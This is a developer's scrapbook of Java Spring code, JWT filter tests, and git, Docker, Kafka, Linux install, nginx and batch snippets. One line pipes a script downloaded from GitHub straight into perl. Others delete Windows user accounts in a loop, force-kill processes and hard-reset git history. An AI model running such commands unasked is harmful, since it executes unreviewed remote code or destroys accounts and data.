        return BaseExceptionHandler.buildResponse(String.valueOf(errorAttributes.get("path")), String.valueOf(errorAttributes.get("message")), HttpStatus.valueOf(response.getStatus()));
    }

    @Override
    public String getErrorPath() {
        return this.path;
    }

    private Map<String, Object> getErrorAttributes(final WebRequest request) {
        final Map<String, Object> errorMap = new HashMap<>();
        errorMap.putAll(this.errorAttributes.getErrorAttributes(request, false));
        return errorMap;
    }
}
--------------------------------------------------------------------------------------------------------
ReflectionTestUtils.setField(tokenProvider, "secretKey", "test secret");
--------------------------------------------------------------------------------------------------------
import com.springio.store.security.AuthoritiesConstants;
import io.github.jhipster.config.JHipsterProperties;
import org.junit.Before;
import org.junit.Test;
import org.springframework.http.HttpStatus;
import org.springframework.mock.web.MockFilterChain;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.test.util.ReflectionTestUtils;

import java.util.Collections;

import static org.assertj.core.api.Assertions.assertThat;

public class JWTFilterTest {


    private TokenProvider tokenProvider;

    private JWTFilter jwtFilter;

    @Before
    public void setup() {
        JHipsterProperties jHipsterProperties = new JHipsterProperties();
        tokenProvider = new TokenProvider(jHipsterProperties);
        ReflectionTestUtils.setField(tokenProvider, "secretKey", "test secret");
        ReflectionTestUtils.setField(tokenProvider, "tokenValidityInMilliseconds", 60000);
        jwtFilter = new JWTFilter(tokenProvider);
        SecurityContextHolder.getContext().setAuthentication(null);
    }

    @Test
    public void testJWTFilter() throws Exception {
        UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(
            "test-user",
            "test-password",
            Collections.singletonList(new SimpleGrantedAuthority(AuthoritiesConstants.USER))
        );
        String jwt = tokenProvider.createToken(authentication, false);
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.addHeader(JWTConfigurer.AUTHORIZATION_HEADER, "Bearer " + jwt);
        request.setRequestURI("/api/test");
        MockHttpServletResponse response = new MockHttpServletResponse();
        MockFilterChain filterChain = new MockFilterChain();
        jwtFilter.doFilter(request, response, filterChain);
        assertThat(response.getStatus()).isEqualTo(HttpStatus.OK.value());
        assertThat(SecurityContextHolder.getContext().getAuthentication().getName()).isEqualTo("test-user");
        assertThat(SecurityContextHolder.getContext().getAuthentication().getCredentials().toString()).isEqualTo(jwt);
    }

    @Test
    public void testJWTFilterInvalidToken() throws Exception {
        String jwt = "wrong_jwt";
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.addHeader(JWTConfigurer.AUTHORIZATION_HEADER, "Bearer " + jwt);
        request.setRequestURI("/api/test");
        MockHttpServletResponse response = new MockHttpServletResponse();
        MockFilterChain filterChain = new MockFilterChain();
        jwtFilter.doFilter(request, response, filterChain);
        assertThat(response.getStatus()).isEqualTo(HttpStatus.OK.value());
        assertThat(SecurityContextHolder.getContext().getAuthentication()).isNull();
    }

    @Test
    public void testJWTFilterMissingAuthorization() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setRequestURI("/api/test");
        MockHttpServletResponse response = new MockHttpServletResponse();
        MockFilterChain filterChain = new MockFilterChain();
        jwtFilter.doFilter(request, response, filterChain);
        assertThat(response.getStatus()).isEqualTo(HttpStatus.OK.value());
        assertThat(SecurityContextHolder.getContext().getAuthentication()).isNull();
    }

    @Test
    public void testJWTFilterMissingToken() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.addHeader(JWTConfigurer.AUTHORIZATION_HEADER, "Bearer ");
        request.setRequestURI("/api/test");
        MockHttpServletResponse response = new MockHttpServletResponse();
        MockFilterChain filterChain = new MockFilterChain();
        jwtFilter.doFilter(request, response, filterChain);
        assertThat(response.getStatus()).isEqualTo(HttpStatus.OK.value());
        assertThat(SecurityContextHolder.getContext().getAuthentication()).isNull();
    }

    @Test
    public void testJWTFilterWrongScheme() throws Exception {
        UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(
            "test-user",
            "test-password",
            Collections.singletonList(new SimpleGrantedAuthority(AuthoritiesConstants.USER))
        );
        String jwt = tokenProvider.createToken(authentication, false);
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.addHeader(JWTConfigurer.AUTHORIZATION_HEADER, "Basic " + jwt);
        request.setRequestURI("/api/test");
    }
}
--------------------------------------------------------------------------------------------------------
public class ExceptionResponse {

  private Integer status;
  private String path;
  private String errorMessage;
  private String timeStamp;
  private String trace;

  public ExceptionResponse(int status, Map<String, Object> errorAttributes) {
    this.setStatus(status);
    this.setPath((String) errorAttributes.get("path"));
    this.setErrorMessage((String) errorAttributes.get("message"));
    this.setTimeStamp(errorAttributes.get("timestamp").toString());
    this.setTrace((String) errorAttributes.get("trace"));
  }

  public Integer getStatus() {
    return status;
  }

  private void setStatus(Integer status) {
    this.status = status;
  }

  public String getErrorMessage() {
    return errorMessage;
  }

  private void setErrorMessage(String errorMessage) {
    this.errorMessage = errorMessage;
  }

  public String getTimeStamp() {
    return timeStamp;
  }

  private void setTimeStamp(String timeStamp) {
    this.timeStamp = timeStamp;
  }

  public String getTrace() {
    return trace;
  }

  private void setTrace(String trace) {
    this.trace = trace;
  }

  public String getPath() {
    return path;
  }

  private void setPath(String path) {
    this.path = path;
  }
}
--------------------------------------------------------------------------------------------------------
    /** MediaType for JSON UTF8 */
    public static final MediaType APPLICATION_JSON_UTF8 = new MediaType(
            MediaType.APPLICATION_JSON.getType(),
            MediaType.APPLICATION_JSON.getSubtype(), Charset.forName("utf8"));
--------------------------------------------------------------------------------------------------------
@FeignClient(name = "currency-exchange")
@RibbonClient(name = "currency-exchange")
public interface CurrencyExchangeProxy {

    @GetMapping("/exchange/{from}/to/{to}")
    PairRateDto callForExchangeValue(@PathVariable("from") String fromValue, @PathVariable("to") String toValue);

}

@RestController
public class WebController {
private static final String template = "Hello, %s!";
    private final AtomicLong counter = new AtomicLong();

    @RequestMapping(value= "/hi", method = RequestMethod.GET)
    public @ResponseBody Greeting sayHello(
            @RequestParam(value = "name", required = false, defaultValue = "Stranger") String name) {
        System.out.println("Inside sayHello() of WebController.java");
        return new Greeting(counter.incrementAndGet(), String.format(template, name));
    }
}
--------------------------------------------------------------------------------------------------------
 this.mockMvc.perform(get("/test"))
                .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.value", is("Hello!")));

--------------------------------------------------------------------------------------------------------
grep --basic-regexp "^.\{1,35\}$"
echo "Hello" | grep --extended-regexp "^.{1,35}$"
--------------------------------------------------------------------------------------------------------
timedatectl set-ntp true
cfdisk

mkfs.ext4 /dev/sda1
mkfs.ext4 /dev/sda2

mount /dev/sda2 /mnt
mkidr /mnt/boot
mount /dev/sda1 /mnt/boot

pacstrap /mnt base

genfstab -U /mnt >> /mnt/etc/fstab
arch-chroot /mnt

ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime

hwclock --systohc

locale-gen
vi /etc/locale.conf
LANG=en_US.UTF-8

systemctl enable dhcpcd
useradd -m -G users,audio,input,optical,storage,video -s /bin/bash username

mkinitcpio -p linux
pacman -S grub
grub-install --target=i386-pc /dev/sda
grub-mkconfig -o /boot/grub/grub.cfg

exit
umount -R /mnt
reboot
--------------------------------------------------------------------------------------------------------
var paragraphs = document.getElementsByTagName("p");
for (var i = 0; i < paragraphs.length; i++) {
  var paragraph = paragraphs.item(i);
  paragraph.style.setProperty("color", "blue", null);
}

d3.selectAll("p").style("color", "blue");
--------------------------------------------------------------------------------------------------------
@Pattern(regexp="[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?", message="Invalid email")//if the field contains email address consider using this annotation to enforce field validation
--------------------------------------------------------------------------------------------------------
Install-Package Umbraco.Iconator
--------------------------------------------------------------------------------------------------------
sudo do-release-upgrade -d
sudo do-release-upgrade

sudo apt install update-manager-core
sudo apt update && sudo apt upgrade

sudo nano /etc/update-manager/release-upgrades
Change Prompt=lts to Prompt=normal. Press Ctrl + X, then y followed by Enter to save the file.

sudo systemctl reboot
sudo reboot
--------------------------------------------------------------------------------------------------------
conda install -c quantnet qnt
conda install package-name=2.3.4
conda install /package-path/package-filename.tar.bz2
conda install /packages-path/packages-filename.tar
--------------------------------------------------------------------------------------------------------
<html>
  <svg
    width="5cm"
    height="4cm"
    version="1.1"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink"
  >
    <path d="M 0 0 L 100 0 L 100 100 L 0 50 Z" />
  </svg>
</html>
--------------------------------------------------------------------------------------------------------
@echo off

:: Connecting to VPN...
rasdial "VPN Name" user pass

echo Running RDP...
"Connect to Server.rdp"

echo Finished - disconnecting from VPN...
rasdial "VPN Name" /disconnect
--------------------------------------------------------------------------------------------------------
systemctl enable myunit
systemctl -l status myunit
systemctl start myunit
systemctl daemon-reload
--------------------------------------------------------------------------------------------------------
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks stash save version_01
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks stash apply stash@{0}

git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks fetch origin
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks pull --no-commit origin master
--------------------------------------------------------------------------------------------------------
spring init --name=scheduler-demo scheduler-demo 
--------------------------------------------------------------------------------------------------------
git config merge.tool vimdiff
git config merge.conflictstyle diff3
git config mergetool.prompt false
--------------------------------------------------------------------------------------------------------
git branch -D PDWB-527_kafka_refactoring
--------------------------------------------------------------------------------------------------------
docker run -d --name axonserver -p 8024:8024 -p 8124:8124 axoniq/axonserver
--------------------------------------------------------------------------------------------------------
$ bin/kafka-topics.sh --create \
  --zookeeper localhost:2181 \
  --replication-factor 1 --partitions 1 \
  --topic mytopic
--------------------------------------------------------------------------------------------------------
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic baeldung
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 5 --topic partitioned
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic filtered
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic greeting
--------------------------------------------------------------------------------------------------------
docker run -e "JAVA_OPTS=-agentlib:jdwp=transport=dt_socket,address=5005,server=y,suspend=n" -p 8080:8080 -p 5005:5005 -t springio/gs-spring-boot-docker
--------------------------------------------------------------------------------------------------------
% pgpk -a KEYS
% pgpv apache-ant-1.10.5-bin.tar.gz.asc
or
% pgp -ka KEYS
% pgp apache-ant-1.10.5-bin.tar.gz.asc
or
% gpg --import KEYS
% gpg --verify apache-ant-1.10.5-bin.tar.gz.asc
--------------------------------------------------------------------------------------------------------
postcss --use autoprefixer -c options.json -o main.css css/*.css
--------------------------------------------------------------------------------------------------------
find ~/.IntelliJIdea* -type d -exec touch -t $(date +"%Y%m%d%H%M") {} ;
--------------------------------------------------------------------------------------------------------
sudo service rsyslog restart
--------------------------------------------------------------------------------------------------------
git remote set-url origin <url>
--------------------------------------------------------------------------------------------------------
git fetch origin
git checkout -b mailer_redis origin/mailer_redis

git fetch origin
git checkout origin/master
git merge --no-ff mailer_redis

git push origin master

git push --set-upstream origin master_redis
--------------------------------------------------------------------------------------------------------
postcss --use autoprefixer -c options.json -o main.css css/*.css
--------------------------------------------------------------------------------------------------------
 scoop bucket add extras
 scoop install alacritty
 
 gem install mustache
--------------------------------------------------------------------------------------------------------
@echo off
rem For each file in your folder
for %%a in (".\*") do (
rem check if the file has an extension and if it is not our script
if "%%~xa" NEQ "" if "%%~dpxa" NEQ "%~dpx0" (
rem check if extension folder exists, if not it is created
if not exist "%%~xa" mkdir "%%~xa"
rem Move the file to directory
move "%%a" "%%~dpa%%~xa\"
))
--------------------------------------------------------------------------------------------------------
docker stop $(docker ps -a -q)
docker rm $(docker ps -a -q)
--------------------------------------------------------------------------------------------------------
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit
git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
git lg
git lg -p
--------------------------------------------------------------------------------------------------------
find . -maxdepth 1 -type d \( ! -name . \) -exec bash -c "cd '{}' && pwd" \;
find . -name .git -type d -execdir git pull -v ';
For /R %%G in (*.LOG) do Echo REN "%%G" "%%~nG.TXT"
For /R C:\temp\ %%G IN (*.bak) do Echo del "%%G"

for /f "delims=" %i in ('dir /ad/s/b') do cacls "%i" >>"%TEMP%\cacls.log"
for /F %i in ('dir /b *.log') do notepad %i
for %i in (user1 user2 user3 user4 user5 user6) do net user /delete %i
for /F %i in (filename) do net user /delete %i

for %i in (set) do command command-arguments

for /F "tokens=2,4 delims=," %i in (test.txt) do @echo %i %j
for /F "tokens=2,4 delims=," %i in (test.txt) do @echo %i,%j
for /F "tokens=2,4" %i in (test.txt) do @echo %i %j

mstsc /console
mstsc /f
mstsc /v:computername
mstsc RDP_filename

start "" http://www.cnn.com
--------------------------------------------------------------------------------------------------------
powercfg/energy

CALL:ECHORED "Print me in red!"
:ECHORED
%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor Red %1
goto:eof
--------------------------------------------------------------------------------------------------------
An alternative command to list folders and sub folders matching a wildcard is DIR:
C:\> dir /b /s /a:d "C:\Work\reports*"

To loop through each folder programatically, we can wrap that in a FOR /F command: 
C:\> for /f "tokens=*" %G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %G

or the same thing in a batch file, with the %'s doubled: 
for /f "tokens=*" %%G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %%G
--------------------------------------------------------------------------------------------------------
find . -type f -regex ".*/build/test-results/.*xml" -exec cp {} $CIRCLE_TEST_REPORTS/junit/ \;
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
git fetch --unshallow || true
git fetch --tags
--------------------------------------------------------------------------------------------------------
git reset --hard @{u}
git branch -a; git tag, git log --all or, my preference, you can look graphically at gitk --all --date-order
git reset --hard REF
git reset --hard HEAD^

git branch nonce $last
git rebase -p --onto $destination $first^ nonce

git checkout $destination
git reset --hard nonce
git branch -d nonce


gitk --all --date-order
git rebase -p --onto $first^ $last $source
git rebase -p --onto SHA^ SHA

https://sethrobertson.github.io/GitFixUm/fixup.html

bfg --strip-blobs-bigger-than 100M --replace-text banned.txt repo.git

git clone --mirror git://example.com/some-big-repo.git
java -jar bfg.jar --strip-blobs-bigger-than 100M some-big-repo.git
$ cd some-big-repo.git
$ git reflog expire --expire=now --all && git gc --prune=now --aggressive
git push

$ bfg --delete-files id_{dsa,rsa}  my-repo.git
$ bfg --strip-blobs-bigger-than 50M  my-repo.git
$ bfg --replace-text passwords.txt  my-repo.git
$ bfg --delete-folders .git --delete-files .git  --no-blob-protection  my-repo.git
$ bfg --strip-biggest-blobs 100 --protect-blobs-from master,maint,next repo.git
--------------------------------------------------------------------------------------------------------
gem install asciidoctor
--------------------------------------------------------------------------------------------------------
docker run -d --name postgres -p 5432:5432 -e POSTGRES_USER=reactive -e POSTGRES_PASSWORD=reactive123 -e POSTGRES_DB=reactive postgres
--------------------------------------------------------------------------------------------------------
$ curl -d '{"name":"Test1"}' -H "Content-Type: application/json" -X POST http://localhost:8095/organizations
$ curl -d '{"name":"Name1", "balance":5000, "organizationId":1}' -H "Content-Type: application/json" -X POST http://localhost:8090/employees
$ curl -d '{"name":"Name2", "balance":10000, "organizationId":1}' -H "Content-Type: application/json" -X POST http://localhost:8090/employees
--------------------------------------------------------------------------------------------------------
$ rm -rf ~/Library/Caches/IntelliJIdea15
$ rm -rf ~/Library/Preferences/IntelliJIdea15
--------------------------------------------------------------------------------------------------------
curl -I https://yourzone-1c6b.kxcdn.com/assets/css/style.css
--------------------------------------------------------------------------------------------------------
Dism /Split-Image /ImageFile:J:\sources\install.wim /SWMFile:H:\CustomInstall\install.swm /FileSize:1000
--------------------------------------------------------------------------------------------------------
readelf -s file
--------------------------------------------------------------------------------------------------------
cd ~/.ssh
ssh-keygen -o
ssh-add /path/to/your/private.key
cat id_rsa.pub
--------------------------------------------------------------------------------------------------------
systemctl start nginx

service nginx stop
systemctl stop nginx

killall -9 nginx

service nginx reload
systemctl reload nginx

nginx -t

service nginx -v
systemctl -v nginx
--------------------------------------------------------------------------------------------------------
.htaccess#
<IfModule mod_headers.c>
    <FilesMatch "\.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$">
        Header set Access-Control-Allow-Origin "*"
    </FilesMatch>
</IfModule>
Nginx#
location ~ \.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$ {
    add_header Access-Control-Allow-Origin "*";
}
--------------------------------------------------------------------------------------------------------
httpd -V
apache2 -M
httpd -M

authn_alias_module
authn_anon_module
authn_dbm_module
authn_default_module
authz_dbm_module
authz_default_module
authnz_ldap_module
cache_module
cgi_module
disk_cache_module
include_module
ldap_module
proxy_balancer_module
proxy_ftp_module
proxy_http_module
proxy_ajp_module
proxy_connect_module
suexec_module
version_module

server {
    server_name origin.example.com;
    listen 80;

    root /var/www/example;
    index index.php index.html index.htm;

    set $cache_path $request_uri;

    # bypass cache for POST requests
    if ($request_method = POST) {
        set $cache_path 'nocache';
    }

    # don't cache login/admin URLs
    if ($request_uri ~* "/(wp-login.php|wp-admin|login.php|backend|admin)") {
        set $cache_path 'nocache';
    }

    # don't cache if there is a cookie called PHPSESSID
    if ($http_cookie ~* "PHPSESSID") {
        set $cache_path 'nocache';
    }

    # bypass cache for logged in users
    if ($http_cookie ~ (wp-postpass|wordpress_|comment_author)_) {
        set $cache_path 'nocache';
    }

    # bypass cache if query string not empty
    if ($query_string) {
        set $cache_path 'nocache';
    }

    location / {
        # this line is specific to Cache Enabler
        try_files /wp-content/cache/cache-enabler/${http_host}${cache_path}index.html $uri $uri/ /index.php?$args;

        if ($cache_path = 'nocache') {
            expires -1;
            add_header Cache-Control no-cache;
        }
    }

    # php7 fastcgi
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
        ...

        fastcgi_intercept_errors on;

        if ($cache_path = 'nocache') {
            expires -1;
            add_header Cache-Control no-cache;
        }
        if ($cache_path != 'nocache') {
            expires +1h;
        }
    }

    # static assets
    location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
        log_not_found off;

        add_header Cache-Control "max-age=604800, stale-while-revalidate=86400, stale-if-error=604800";
    }
}
--------------------------------------------------------------------------------------------------------
curl -sL https://raw.githubusercontent.com/richardforth/apache2buddy/master/apache2buddy.pl | perl
--------------------------------------------------------------------------------------------------------
grep processor /proc/cpuinfo | wc -l
--------------------------------------------------------------------------------------------------------
npm install -g caniuse-cmd
caniuse preload

npm install uglify-js -g
uglifyjs jquery-3.2.1.js --output jquery-3.2.1.min.js

uglifyjs jquery-3.2.1.js --compress --mangle --output jquery-3.2.1.min.js

glifyjs jquery-3.2.1.js --compress sequences=true,conditionals=true,booleans=true --mangle --output jquery-3.2.1.min.js
--------------------------------------------------------------------------------------------------------
sudo apt install kodi
sudo apt install software-properties-common
sudo add-apt-repository ppa:team-xbmc/ppa
sudo apt update
sudo apt install kodi

sudo apt update
sudo apt install kodi

sudo dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm
sudo gedit /etc/selinux/config
sudo dnf install kodi

pacman -Syu
pacman -S kodi
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Export-Package: com.netflix.hystrix;version="1.5.12";uses:="com.netfli
 x.hystrix.collapser,com.netflix.hystrix.metric,com.netflix.hystrix.st
 rategy.concurrency,com.netflix.hystrix.strategy.properties,com.netfli
 x.hystrix.util,rx,rx.functions",com.netflix.hystrix.collapser;version
 ="1.5.12";uses:="com.netflix.hystrix,com.netflix.hystrix.strategy.con
 currency,com.netflix.hystrix.util,rx",com.netflix.hystrix.config;vers
 ion="1.5.12";uses:="com.netflix.hystrix,rx",com.netflix.hystrix.excep
 tion;version="1.5.12";uses:="com.netflix.hystrix",com.netflix.hystrix
 .metric;version="1.5.12";uses:="com.netflix.hystrix,com.netflix.hystr
 ix.strategy.concurrency,org.HdrHistogram,rx,rx.functions",com.netflix
 .hystrix.metric.consumer;version="1.5.12";uses:="com.netflix.hystrix,
 com.netflix.hystrix.metric,org.HdrHistogram,rx,rx.functions",com.netf
 lix.hystrix.metric.sample;version="1.5.12";uses:="com.netflix.hystrix
 ,rx",com.netflix.hystrix.strategy;version="1.5.12";uses:="com.netflix
 .hystrix.strategy.concurrency,com.netflix.hystrix.strategy.eventnotif
 ier,com.netflix.hystrix.strategy.executionhook,com.netflix.hystrix.st
 rategy.metrics,com.netflix.hystrix.strategy.properties",com.netflix.h
 ystrix.strategy.concurrency;version="1.5.12";uses:="com.netflix.hystr
 ix,com.netflix.hystrix.strategy.properties,rx,rx.functions",com.netfl
 ix.hystrix.strategy.eventnotifier;version="1.5.12";uses:="com.netflix
 .hystrix",com.netflix.hystrix.strategy.executionhook;version="1.5.12"
 ;uses:="com.netflix.hystrix,com.netflix.hystrix.exception",com.netfli
 x.hystrix.strategy.metrics;version="1.5.12";uses:="com.netflix.hystri
 x",com.netflix.hystrix.strategy.properties;version="1.5.12";uses:="co
 m.netflix.config,com.netflix.hystrix",com.netflix.hystrix.strategy.pr
 operties.archaius;version="1.5.12";uses:="com.netflix.hystrix.strateg
 y.properties",com.netflix.hystrix.util;version="1.5.12";uses:="com.ne
 tflix.hystrix,com.netflix.hystrix.strategy.properties"
Implementation-Title: com.netflix.hystrix#hystrix-core;1.5.12
Change: a7b66ca
Built-By: jenkins
Tool: Bnd-3.2.0.201605172007
Gradle-Version: 3.1
Built-OS: Linux
Build-Host: https://netflixoss.ci.cloudbees.com/
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.6))"
Module-Source: /hystrix-core
Build-Number: 72
Module-Origin: git@github.com:Netflix/Hystrix.git
Bundle-SymbolicName: com.netflix.hystrix.core
Build-Id: 72
Eclipse-ExtensibleAPI: true
X-Compile-Target-JDK: 1.6
Implementation-Version: 1.5.12
Module-Owner: netflixoss@netflix.com
Bundle-Name: hystrix-core
Created-By: 1.7.0_79-b15 (Oracle Corporation)
Build-Job: NetflixOSS/Hystrix/Hystrix-release
Build-Date: 2017-05-16_16:00:19
X-Compile-Source-JDK: 1.6
Build-Java-Version: 1.7.0_79
Bundle-Vendor: Netflix
Built-Status: integration
Bundle-Version: 1.5.12
Branch: master
Bnd-LastModified: 1494975639000
Bundle-ManifestVersion: 2
Module-Email: netflixoss@netflix.com
Import-Package: com.netflix.config,com.netflix.hystrix;version="[1.5,2
 )",com.netflix.hystrix.collapser;version="[1.5,2)",com.netflix.hystri
 x.exception;version="[1.5,2)",com.netflix.hystrix.metric;version="[1.
 5,2)",com.netflix.hystrix.metric.consumer;version="[1.5,2)",com.netfl
 ix.hystrix.strategy;version="[1.5,2)",com.netflix.hystrix.strategy.co
 ncurrency;version="[1.5,2)",com.netflix.hystrix.strategy.eventnotifie
 r;version="[1.5,2)",com.netflix.hystrix.strategy.executionhook;versio
 n="[1.5,2)",com.netflix.hystrix.strategy.metrics;version="[1.5,2)",co
 m.netflix.hystrix.strategy.properties;version="[1.5,2)",com.netflix.h
 ystrix.util;version="[1.5,2)",org.HdrHistogram;version="[2.1,3)",org.
 slf4j;version="[1.7,2)",rx;version="[1.2,2)",rx.functions;version="[1
 .2,2)",rx.internal.schedulers;version="[1.2,2)",rx.observables;versio
 n="[1.2,2)",rx.observers;version="[1.2,2)",rx.schedulers;version="[1.
 2,2)",rx.subjects;version="[1.2,2)",rx.subscriptions;version="[1.2,2)
 ",sun.misc]
Embed-Dependency: *;scope=compile
Bundle-DocURL: https://github.com/Netflix/Hystrix
--------------------------------------------------------------------------------------------------------
	static {
		WEAVING_MODE = System.getProperty("weavingMode", WeavingMode.RUNTIME.name()).toUpperCase();
	}
--------------------------------------------------------------------------------------------------------
<ehcache xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:noNamespaceSchemaLocation="ehcache.xsd" 
	updateCheck="true"
	monitoring="autodetect" 
	dynamicConfig="true">

	<diskStore path="java.io.tmpdir" />
	
	<cache name="movieFindCache" 
		maxEntriesLocalHeap="10000"
		maxEntriesLocalDisk="1000" 
		eternal="false" 
		diskSpoolBufferSizeMB="20"
		timeToIdleSeconds="300" timeToLiveSeconds="600"
		memoryStoreEvictionPolicy="LFU" 
		transactionalMode="off">
		<persistence strategy="localTempSwap" />
	</cache>

</ehcache>

import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.ehcache.EhCacheCacheManager;
import org.springframework.cache.ehcache.EhCacheManagerFactoryBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ClassPathResource;

@Configuration
@EnableCaching
@ComponentScan({ "com.mkyong.*" })
public class AppConfig {

	@Bean
	public CacheManager cacheManager() {
		return new EhCacheCacheManager(ehCacheCacheManager().getObject());
	}

	@Bean
	public EhCacheManagerFactoryBean ehCacheCacheManager() {
		EhCacheManagerFactoryBean cmfb = new EhCacheManagerFactoryBean();
		cmfb.setConfigLocation(new ClassPathResource("ehcache.xml"));
		cmfb.setShared(true);
		return cmfb;
	}
}
--------------------------------------------------------------------------------------------------------
import org.ehcache.event.CacheEvent;
import org.ehcache.event.CacheEventListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CacheEventLogger implements CacheEventListener<Object, Object> {

    private static final Logger log = LoggerFactory.getLogger(CacheEventLogger.class);

    @Override
    public void onEvent(CacheEvent<? extends Object, ? extends Object> cacheEvent) {
        log.info("Cache event {} for item with key {}. Old value = {}, New value = {}", cacheEvent.getType(), cacheEvent.getKey(), cacheEvent.getOldValue(), cacheEvent.getNewValue());
    }
}

spring.cache.jcache.config=classpath:ehcache.xml

<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://www.ehcache.org/v3"
    xmlns:jsr107="http://www.ehcache.org/v3/jsr107"
    xsi:schemaLocation="
            http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd
            http://www.ehcache.org/v3/jsr107 http://www.ehcache.org/schema/ehcache-107-ext-3.0.xsd">

    <cache alias="squareCache">
        <key-type>java.lang.Long</key-type>
        <value-type>java.math.BigDecimal</value-type>
        <expiry>
            <ttl unit="seconds">30</ttl>
        </expiry>

        <listeners>
            <listener>
                <class>com.baeldung.cachetest.config.CacheEventLogger</class>
                <event-firing-mode>ASYNCHRONOUS</event-firing-mode>
                <event-ordering-mode>UNORDERED</event-ordering-mode>
                <events-to-fire-on>CREATED</events-to-fire-on>
                <events-to-fire-on>EXPIRED</events-to-fire-on>
            </listener>
        </listeners>

        <resources>
            <heap unit="entries">2</heap>
            <offheap unit="MB">10</offheap>
        </resources>
    </cache>

</config>
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
apply plugin: 'eclipse-wtp'
 
version = '1.0'

// Uses JDK 7
sourceCompatibility = 1.7
targetCompatibility = 1.7

// Get dependencies from Maven central repository
repositories {
	mavenCentral()
}

//Project dependencies
dependencies {
	compile 'org.springframework:spring-context:4.1.4.RELEASE'
	compile 'org.springframework:spring-context-support:4.1.4.RELEASE'
	compile 'net.sf.ehcache:ehcache:2.9.0'
	compile 'ch.qos.logback:logback-classic:1.0.13'
}
--------------------------------------------------------------------------------------------------------
@CacheResult(cacheName="books", exceptionCacheName="failures"
            cachedExceptions = InvalidIsbnNotFoundException.class)
public Book findBook(ISBN isbn)
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "stepOne")
public String stepOne(@Validated(Account.ValidationStepOne.class) Account account) {...}

@RequestMapping(value = "stepTwo")
public String stepTwo(@Validated(Account.ValidationStepTwo.class) Account account) {...}

public class Account {

    @NotBlank(groups = {ValidationStepOne.class})
    private String username;

    @Email(groups = {ValidationStepOne.class})
    @NotBlank(groups = {ValidationStepOne.class})
    private String email;

    @NotBlank(groups = {ValidationStepTwo.class})
    @StrongPassword(groups = {ValidationStepTwo.class})
    private String password;

    @NotBlank(groups = {ValidationStepTwo.class})
    private String confirmedPassword;

}
--------------------------------------------------------------------------------------------------------
LocalDate date = LocalDate.of(2015, 8, 11);
TypedQuery query = this.em.createQuery("SELECT e FROM MyEntity e WHERE date BETWEEN :start AND :end", MyEntity.class);
query.setParameter("start", date.minusDays(2));
query.setParameter("end", date.plusDays(7));
MyEntity e = query.getSingleResult();

https://thoughts-on-java.org/persist-localdate-localdatetime-jpa/
--------------------------------------------------------------------------------------------------------
https://github.com/spring-projects/spring-data-examples/tree/master/jpa/example/src/main/java/example/springdata/jpa/auditing
--------------------------------------------------------------------------------------------------------
import org.hibernate.annotations.Type;
import org.springframework.data.annotation.CreatedBy;
import org.springframework.data.annotation.CreatedDate;
import org.springframework.data.annotation.LastModifiedBy;
import org.springframework.data.annotation.LastModifiedDate;
